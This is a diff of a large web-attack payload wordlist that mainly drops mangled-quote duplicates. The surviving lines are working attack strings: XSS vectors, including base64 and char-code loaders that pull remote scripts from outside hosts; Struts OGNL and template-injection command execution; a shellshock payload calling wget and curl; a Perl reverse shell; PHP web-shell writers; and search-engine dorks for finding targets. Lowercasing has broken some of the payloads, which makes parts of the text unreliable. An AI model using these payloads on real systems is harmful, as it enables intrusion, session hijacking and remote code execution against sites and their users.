@@ -17,20 +17,8 @@
 "><input onfocus=eval(atob(this.id)) id=dmfyige9zg9jdw1lbnquy3jlyxrlrwxlbwvudcgic2nyaxb0iik7ys5zcmm9imh0dhbzoi8vagfja2vyb25lb2zqywfhac54c3muahqio2rvy3vtzw50lmjvzhkuyxbwzw5kq2hpbgqoysk7 autofocus>
 "><input onfocus=eval(atob(this.id)) id=dmfyige9zg9jdw1lbnquy3jlyxrlrwxlbwvudcgic2nyaxb0iik7ys5zcmm9imh0dhbzoi8vemvyby54c3muahqio2rvy3vtzw50lmjvzhkuyxbwzw5kq2hpbgqoysk7 autofocus>
 "><script>alert(1)</script>=1"onpaste="eval(';)\'ssx\'(trela'.split('').reverse().join(''))"
-"><script>eval(atob(�amf2yxnjcmlwddphbgvydcgxkq�));</script>
-"><script>eval(atob(‘amf2yxnjcmlwddphbgvydcgxkq’));</script>
 "><script>eval(string.fromcharcode(75,67,70));</script>
 "><script>eval(string.fromcharcode(97,61,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,97,46,115,114,99,61,39,104,116,116,112,58,47,47,104,52,107,46,105,110,47,105,46,106,115,39,59,100,111,99,117,109,101,110,116,46,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,97,41,59))</script>
-"><script>eval(�a\154ert(1)�);</script>
-"><script>eval(�a\l\ert\(1\)�);</script>
-"><script>eval(�a\u006cert(1)�);</script>
-"><script>eval(�a\x6cert(1)�);</script>
-"><script>eval(�al�+�ert(1)�);</script>
-"><script>eval(‘a\154ert(1)’);</script>
-"><script>eval(‘a\l\ert\(1\)’);</script>
-"><script>eval(‘a\u006cert(1)’);</script>
-"><script>eval(‘a\x6cert(1)’);</script>
-"><script>eval(‘al’+’ert(1)’);</script>
 "><video><source onerror=eval(atob(this.id)) id=dmfyige9zg9jdw1lbnquy3jlyxrlrwxlbwvudcgic2nyaxb0iik7ys5zcmm9imh0dhbzoi8vemvyby54c3muahqio2rvy3vtzw50lmjvzhkuyxbwzw5kq2hpbgqoysk7>
 ">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/xss/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http: //i.imgur.com/p8ml8.jpg">
 ">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/xss/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http: //i.imgur.com/p8ml8.jpg"><script>onerror=alert;throw 1337</script>
@@ -47,9 +35,6 @@ $eval('x=alert(1)//');  }}
 ${%23_memberaccess%3d%40ognl.ognlcontext%40default_member_access,%23wwww=@java.lang.runtime@getruntime(),%23ssss=new%20java.lang.string[3],%23ssss[0]="%2fbin%2fsh",%23ssss[1]="%2dc",%23ssss[2]=%23parameters.injparam[0],%23wwww.exec(%23ssss),%23kzxs%3d%40org.apache.struts2.servletactioncontext%40getresponse().getwriter()%2c%23kzxs.print(%23parameters.injparam[0])%2c%23kzxs.close(),1%3f%23xx%3a%23request.tostring}&injparam=touch%20/tmp/injectedfile.txt
 ${%23_memberaccess%3d%40ognl.ognlcontext%40default_member_access,%23wwww=@java.lang.runtime@getruntime(),%23ssss=new%20java.lang.string[3],%23ssss[0]="cmd",%23ssss[1]="%2fc",%23ssss[2]=%23parameters.injparam[0],%23wwww.exec(%23ssss),%23kzxs%3d%40org.apache.struts2.servletactioncontext%40getresponse().getwriter()%2c%23kzxs.print(%23parameters.injparam[0])%2c%23kzxs.close(),1%3f%23xx%3a%23request.tostring}&injparam=touch%20/tmp/injectedfile.txt
 ${@print(system($_server['http_user_agent']))}
-${@print(system(â€œwhoamiâ€))}
-${@print(system(“dir”))}
-${@print(system(“whoami”))}
 ${exec(print(`echo%20aojpqw\necho%20$((18%2b92))\necho%20aojpqw\necho%20aojpqw`)%3b%25252529%2525257daojpqw
 ${exec(print(`echo%20asbmqm;echo%20$((65%2b46));echo%20asbmqm;echo%20asbmqm`)%3b%2523asbmqm
 ${exec(print(`echo%20bdbpsz;echo%20$((87%2b50));echo%20bdbpsz;echo%20bdbpsz`)%3bbdbpsz
@@ -269,19 +254,7 @@ ${t(org.apache.commons.io.ioutils).tostring(t(java.lang.runtime).getruntime().ex
 '><img src="x:gif" onerror="eval('al'%2b'lert(1)')">
 '><img src=x:alert(alt) onerror=eval(src) alt=0>
 '><script>alert(1)</script>"><img/id="confirm&lpar;1&#x29;"/alt="/"src="/"onerror=eval(id&#x29;>'"><img src="http://127.0.0.1:3555/xss_serve_payloads/x.jpg">
-'><script>eval(atob(�amf2yxnjcmlwddphbgvydcgxkq�));</script>
-'><script>eval(atob(‘amf2yxnjcmlwddphbgvydcgxkq’));</script>
 '><script>eval(string.fromcharcode(75,67,70));</script>
-'><script>eval(�a\154ert(1)�);</script>
-'><script>eval(�a\l\ert\(1\)�);</script>
-'><script>eval(�a\u006cert(1)�);</script>
-'><script>eval(�a\x6cert(1)�);</script>
-'><script>eval(�al�+�ert(1)�);</script>
-'><script>eval(‘a\154ert(1)’);</script>
-'><script>eval(‘a\l\ert\(1\)’);</script>
-'><script>eval(‘a\u006cert(1)’);</script>
-'><script>eval(‘a\x6cert(1)’);</script>
-'><script>eval(‘al’+’ert(1)’);</script>
 () { :;};/usr/bin/perl -e 'print \"content-type: text/plain\\r\\n\\r\\nxsuccess!\";system(\"wget http://135.23.158.130/.testing/shellshock.txt?vuln=13;curl http://135.23.158.130/.testing/shellshock.txt?vuln=15;\");'
 (_=''.sub).call.call({}[$='constructor'].getownpropertydescriptor(_.__proto__,$).value,0,'eval("
 (location.hash){eval(location.hash.slice(1))}else{confirm(document.location)}//<img src="x:x" onerror="if(location.hash){eval(location.hash.slice(1))}else{confirm(document.location)}">
@@ -324,7 +297,6 @@ ${t(org.apache.commons.io.ioutils).tostring(t(java.lang.runtime).getruntime().ex
 <code>eval(name)</code>
 <code>with(location)with(hash)eval(substring(1))</code>
 <desc>if no quotes of any kind are allowed you can eval() a fromcharcode in javascript to create any xss vector you need.</desc>
-<div id="1"><form id="test"></form><button form="test" formaction="javascript:alert(1)">x</button>//["'`-->]]>]</div><div id="2"><meta charset="x-imap4-modified-utf7">&adz&agn&ag0&aef&aca&ahm&ahi&ago&ad0&agn&aca&ag8abg&aguacgbyag8acga9ageabablahiadaaoadeakq&acaapabi//["'`-->]]>]</div><div id="3"><meta charset="x-imap4-modified-utf7">&<script&s1&ts&1>alert&a7&(1)&r&ua;&&<&a9&11/script&x&>//["'`-->]]>]</div><div id="4">0?<script>worker("#").onmessage=function(_)eval(_.data)</script> :postmessage(importscripts('data:;base64,cg9zde1lc3nhz2uoj2fszxj0kdepjyk'))//["'`-->]]>]</div><div id="5"><script>crypto.generatecrmfrequest('cn=0',0,0,null,'alert(5)',384,null,'rsa-dual-use')</script>//["'`-->]]>]</div><div id="6"><script>({set/**/$($){_/**/setter=$,_=1}}).$=alert</script>//["'`-->]]>]</div><div id="7"><input onfocus=alert(7) autofocus>//["'`-->]]>]</div><div id="8"><input onblur=alert(8) autofocus><input autofocus>//["'`-->]]>]</div><div id="9"><a style="-o-link:'javascript:alert(9)';-o-link-source:current">x</a>//["'`-->]]>]</div><div id="10"><video poster=javascript:alert(10)//></video>//["'`-->]]>]</div><div id="11"><svg xmlns="http://www.w3.org/2000/svg"><g onload="javascript:alert(11)"></g></svg>//["'`-->]]>]</div><div id="12"><body onscroll=alert(12)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>//["'`-->]]>]</div><div id="13"><x repeat="template" repeat-start="999999">0<y repeat="template" repeat-start="999999">1</y></x>//["'`-->]]>]</div><div id="14"><input pattern=^((a+.)a)+$ value=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!>//["'`-->]]>]</div><div id="15"><script>({0:#0=alert/#0#/#0#(0)})</script>//["'`-->]]>]</div><div id="16">x<x style=`behavior:url(#default#time2)` onbegin=`alert(16)` >//["'`-->]]>]</div><div id="17"><?xml-stylesheet href="javascript:alert(17)"?><root/>//["'`-->]]>]</div><div id="18"><script xmlns="http://www.w3.org/1999/xhtml">&#x61;l&#x65;rt&#40;1)</script>//["'`-->]]>]</div><div id="19"><meta charset="x-mac-farsi">¼script ¾alert(19)//¼/script ¾//["'`-->]]>]</div><div id="20"><script>referenceerror.prototype.__definegetter__('name', function(){alert(20)}),x</script>//["'`-->]]>]</div><div id="21"><script>object.__nosuchmethod__ = function,[{}][0].constructor._('alert(21)')()</script>//["'`-->]]>]</div><div id="22"><input onblur=focus() autofocus><input>//["'`-->]]>]</div><div id="23"><form id=test onforminput=alert(23)><input></form><button form=test onformchange=alert(2)>x</button>//["'`-->]]>]</div><div id="24">1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=alert(24)&gt;`>//["'`-->]]>]</div><div id="25"><script src="#">{alert(25)}</script>;1//["'`-->]]>]</div><div id="26">+adw-html+ad4apa-body+ad4apa-div+ad4-top secret+adw-/div+ad4apa-/body+ad4apa-/html+ad4-.toxmlstring().match(/.*/m),alert(regexp.input);//["'`-->]]>]</div><div id="27"><style>p[foo=bar{}*{-o-link:'javascript:alert(27)'}{}*{-o-link-source:current}*{background:red}]{background:green};</style>//["'`-->]]>]</div>
 <div style="-moz-binding:url(http://xssor.io/0.xml#xss);x:expression((window.r!=1)?eval('x=string.fromcharcode;scr=document.createelement(x(115,99,114,105,112,116));scr.setattribute(x(115,114,99),x(104,116,116,112,58,47,47,119,119,119,46,48,120,51,55,46,99,111,109,47,48,46,106,115));document.getelementbyid(x(105,110,106,101,99,116)).appendchild(scr);window.r=1;'):1);"id="inject">
 <div style="x:expression((window.r==1)?'':eval('r=1;
 <form id="myform" value="" action=javascript&tab;:eval(document.getelementbyid('myform').elements[0].value)><textarea>alert(1)</textarea><input type="submit" value="absenden"></form>
@@ -369,22 +341,10 @@ ${t(org.apache.commons.io.ioutils).tostring(t(java.lang.runtime).getruntime().ex
 <script>eval("\x61\x6c\x65\x72\x74(1)");</script> // hexadecimal escapes using eval
 <script>eval('\\u'+'0061'+'lert(1)')</script>     <script>throw~delete~typeof~prompt(1)</script>     <script>delete[a=alert]/prompt a(1)</script>     <script>delete[a=this[atob('ywxlcnq=')]]/prompt a(1)</script>     <script>(()=>{return this})().alert(1)</script>
 <script>eval('al'+'ert(1)');</script>
-<script>eval(atob(�amf2yxnjcmlwddphbgvydcgxkq�));</script>
-<script>eval(atob(‘amf2yxnjcmlwddphbgvydcgxkq’));</script>
 <script>eval(location.hash)</script> (firefox)
 <script>eval(location.hash.slice(1))</script>
 <script>eval(location.hash.slice(1)</script>
 <script>eval(string.fromcharcode(75,67,70));</script>
-<script>eval(�a\154ert(1)�);</script>
-<script>eval(�a\l\ert\(1\)�);</script>
-<script>eval(�a\u006cert(1)�);</script>
-<script>eval(�a\x6cert(1)�);</script>
-<script>eval(�al�+�ert(1)�);</script>
-<script>eval(‘a\154ert(1)’);</script>
-<script>eval(‘a\l\ert\(1\)’);</script>
-<script>eval(‘a\u006cert(1)’);</script>
-<script>eval(‘a\x6cert(1)’);</script>
-<script>eval(‘al’+’ert(1)’);</script>
 <script>for((i)in(self))eval(i)(1)</script>
 <script>function b(){eval(this.responsetext)};a=new xmlhttprequest();a.addeventlistener("load", b);a.open("get", "//hackeroneofjaaah.xss.ht");a.send();</script>
 <script>function b(){eval(this.responsetext)};a=new xmlhttprequest();a.addeventlistener("load", b);a.open("get", "//zero.xss.ht");a.send();</script>
@@ -395,7 +355,6 @@ ${t(org.apache.commons.io.ioutils).tostring(t(java.lang.runtime).getruntime().ex
 <script>top.require('child_process').execsync('open -a calculator')</script>
 <script>try{eval("<></>");logboolean(1)}catch(e){logboolean(0)};</script>
 <select id=xss onfocus=javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus>
-<style>body:after{content: “\61\6c\65\72\74\28\31\29″}</style><script>eval(eval(document.stylesheets[0].cssrules[0].style.content))</script>
 <svg id=alert(1) onload=eval(id)>
 <svg id=alert(1337) onload=eval(id)>
 <svg onload=eval(document.cookie)>
@@ -416,12 +375,9 @@ ${t(org.apache.commons.io.ioutils).tostring(t(java.lang.runtime).getruntime().ex
 <video id=xss poster=javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32))//
 <video onerror="javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32))"><source>
 <video><source onerror="javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32))">
-=â€™â€><img/src=â€xâ€onerror=eval(string.fromcharcode(119,105,110,100,111,119,46,108,111,99,97,108,83,116,111,114,97,103,101,46,115,101,116,73,116,101,109,40,39,105,100,39,44,39,34,62,60,105,109,103,47,115,114,99,61,92,34,120,92,34,111,110,101,114,114,111,114,61,97,108,101,114,116,40,49,41,62,39,41))>
-=’”><img/src=”x”onerror=eval(string.fromcharcode(119,105,110,100,111,119,46,108,111,99,97,108,83,116,111,114,97,103,101,46,115,101,116,73,116,101,109,40,39,105,100,39,44,39,34,62,60,105,109,103,47,115,114,99,61,92,34,120,92,34,111,110,101,114,114,111,114,61,97,108,101,114,116,40,49,41,62,39,41))>
 ?t=confirm(1)&k7="><svg/t='&k8='onload='/&k9=/+eval(t)'
 ?xss7=''\"--><script>eval(string.fromcharcode(88,83,83)));%00
 ["a",'eval("var _ = document.createelement(\'script\');
-[f,b,z,s,j,o,w,u,e] = [!!0] + !0;eval(eval("window.b+z+window.j+window.w+o+'(0b10100111001��_–)
 __import__('os').system('ls')
 a=";get";;&;#10;b=";url(";";;&;#10;c=";javascript:";;&;#10;d=";alert(';xss';);";)";;&#10;eval(a+b+c+d);
 a="get";&#10;b="url("";&#10;c="javascript:";&#10;d="alert('xss');")";eval(a+b+c+d);
@@ -460,8 +416,6 @@ echo "<?php system('dir $_get['dir']'); ?>" > dir.php
 echo "use socket;$i="192.168.16.151";$p=443;socket(s,pf_inet,sock_stream,getprotobyname("tcp"));if(connect(s,sockaddr_in($p,inet_aton($i)))){open(stdin,">&s");open(stdout,">&s");open(stderr,">&s");exec("/bin/sh -i");};" > rev.pl
 eval(
 eval("1+1?>");eval("1+1</script>");eval("1+1//?>");
-eval("\x61\x6c\x65\x72\x74\x28\x31\x29â€)
-eval("\x61\x6c\x65\x72\x74\x28\x31\x29”)
 eval("ale" + (!![]+[])[+!+[]]+(!![]+[])[+[]])(1)
 eval("aler"+(!![]+[])[+[]])("x")
 eval("echo 123");
@@ -535,13 +489,9 @@ insert into lol.pwn (dataz) values ("<?php system($_get['cmd']); ?>");--
 intext:"include()" +site:mm
 inurl:"id=" & intext:"warning: pg_exec()
 inurl:"id=" & intext:"warning: require()
-inurl:”id=” & intext:”warning: pg_exec()
-inurl:”id=” & intext:”warning: require()
 javascript:/*-- >]]>%>?></script></title></textarea></noscript></style></xmp>">[img=1,name=/alert(1)/.source]<img - /style=a:expression&#40&#47&#42'/- /*&#39,/**/eval(name)/*%2a///*///&#41;;width:100%;height:100%;position:absolute;-ms- behavior:url(#default#time2) name=alert(1)onerror=eval(name) src=1 autofocus onfocus=eval(name) onclick=eval(name) onmouseover=eval(name) onbegin=eval(name) background=javascript:eval(name)//>"
 javascript:/*-- >]]>%>?></script></title></textarea></noscript></style></xmp>">[img=1,name=/alert(1)/.source]<img - /style=a:expression&#40&#47&#42'/- /*&#39,/**/eval(name)/*%2a///*///&#41;;width:100%;height:100%;position:absolute;-ms-behavior:url(#default#time2) name=alert(1)onerror=eval(name) src=1 autofocus onfocus=eval(name)onclick=eval(name) onmouseover=eval(name) onbegin=eval(name)background=javascript:eval(name)//>"
 javascript:/*-->]]>%>?></script></title></textarea></noscript></style></xmp>">[img=1,name=/alert(1)/.source]<img -/style=a:expression&#40&#47&#42'/-/*&#39,/**/eval(name)/*%2a///*///&#41;;width:100%;height:100%;position:absolute;-ms-behavior:url(#default#time2) name=alert(1) onerror=eval(name) src=1 autofocus onfocus=eval(name) onclick=eval(name) onmouseover=eval(name) onbegin=eval(name) background=javascript:eval(name)//>"
-javascript:/*�></marquee></script></title></textarea></noscript></style></xmp>�> [img=1]<img -/style=-=expression&#40/*�/-/*',/**/eval(name)//);wi dth:100%;height:100%;position:absolute;behavior:url(#default#vml);-o-link:javascript :eval(title);-o-link-source:current name=alert(1) onerror=eval(name) src=1 autofocus onfocus=eval(name) onclick=eval(name) onmouseover=eval(name) background=javascript:eval(name)//>�"/>
-javascript:/*–></marquee></script></title></textarea></noscript></style></xmp>”> [img=1]<img -/style=-=expression&#40/*’/-/*',/**/eval(name)//);wi dth:100%;height:100%;position:absolute;behavior:url(#default#vml);-o-link:javascript :eval(title);-o-link-source:current name=alert(1) onerror=eval(name) src=1 autofocus onfocus=eval(name) onclick=eval(name) onmouseover=eval(name) background=javascript:eval(name)//>”"/>
 javascript:alert()//*/alert()/*'-/"/-eval(`(alert())`)//\"-alert()//--></title></style></noscript></textarea></template></noembed><script>alert()</script><frameset onload=alert()><svg/onload=alert(1)> alert()//
 javascript:eval('var a=document.createelement(\'script\');a.src=\'https://hackeroneofjaaah.xss.ht\';document.body.appendchild(a)')
 javascript:eval('var a=document.createelement(\'script\');a.src=\'https://zero.xss.ht\';document.body.appendchild(a)')
@@ -636,5 +586,3 @@ zjavascript:eval('var a=document.createelement('script');a.src='https://zyqa.ga/
 | system('sleep 5');
 || system('curl https://crowdshield.com/.testing/rce_vuln.txt');
 || system('sleep 5');
-“id=” & intext:”warning: pg_exec()
-“id=” & intext:”warning: require()
